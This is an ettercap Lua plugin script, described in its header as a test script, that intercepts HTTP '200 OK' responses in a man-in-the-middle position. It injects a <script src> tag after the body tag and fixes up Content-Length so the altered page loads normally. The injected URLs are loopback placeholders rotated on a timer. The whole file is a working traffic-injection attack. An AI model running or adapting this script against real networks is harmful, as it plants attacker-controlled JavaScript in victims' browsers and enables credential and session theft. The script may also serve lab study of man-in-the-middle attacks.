description = "This is a test script that will inject HTTP stuff";

require 'os'
local hook_points = require("hook_points")
local shortpacket = require("shortpacket")
local shortsession = require("shortsession")
local packet = require("packet")

-- We have to hook at the filtering point so that we are certain that all the 
-- dissectors hae run.
hook_point = hook_points.filter

function split_http(str)
  local start,finish,header,body = string.find(str, '(.-\r?\n\r?\n)(.*)')
  return start,finish,header, body
end

function shrink_http_body(body)
  local modified_body = string.gsub(body, '>%s*<','><')
  return modified_body
end

-- Cache our starts-with function...
local sw = shortpacket.data_starts_with("HTTP/1.")
-- We only want to match packets that look like HTTP responses.
packetrule = function(packet_object)
  if packet.is_tcp(packet_object) == false then
    return false
  end
  -- Check to see if it starts with the right stuff.
  return sw(packet_object)
end

local session_key = shortsession.ip_session

-- Here's your action.
action = function(po) 
  local session_id = session_key(po)
  local urls = { 'http://127.0.0.1',
		 'http://127.0.0.2',
		 'http://127.0.0.3'}

  if not session_id then
    -- If we don't have session_id, then bail.
    return nil
  end
  --local src_ip = ""
  --local dst_ip = ""
  local src_ip = packet.src_ip(po)
  local dst_ip = packet.dst_ip(po)
  
  -- ettercap.log("inject_4ttp: " .. src_ip .. " -> " .. dst_ip .. "\n")
  -- Get the full buffer....
  reg = ettercap.reg.create_namespace(session_id)
  local buf = packet.read_data(po)
  if not(string.match(buf,"200 OK")) then
	return nil
  end
  -- Split the header/body up so we can manipulate things.
  local start,finish,header, body = split_http(buf)
  -- local start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
  if not reg['count'] then
	reg['count'] = 0	
	reg['time'] = 0
  end
  
  -- If 5 seonds have passed, incriment count
  if os.time() - reg['time'] > 5 then
  	reg['count'] = reg['count'] + 1
	reg['time'] = os.time()
  end
  
	
  if (not (start == nil)) then
    -- We've got a proper split.
    local orig_body_len = string.len(body)

    -- URL will vary based on count, but if it doesn't exist, we're done
    local url = urls[reg['count']]
    if url == nil then
	return nil
    end

    local modified_body = string.gsub(body, '<[bB][oO][dD][yY]>','<body><script src="' .. url .. '"></script>')

    -- We've tweaked things, so let's update the data.
    if (not(modified_body == body)) then
      local modified_data = ""
      local content_length = string.match(header, "Content.Length:.(%d+).")
      if content_length then
 	ettercap.log("Found a content length of " .. tostring(content_length) .. "\n")
      	content_length = content_length + (string.len(modified_body) - orig_body_len)
      	local modified_header = string.gsub(header, "Content.Length: %d+", "Content-Length: " .. tostring(content_length) .. "\n")
      	 modified_data = modified_header .. modified_body
	 ettercap.log(modified_data)
      else
      	modified_data = header .. modified_body
      end

      -- This takes care of setting the packet data, as well as flagging it 
      -- as modified.
      packet.set_data(po, modified_data)
    end
  end
end
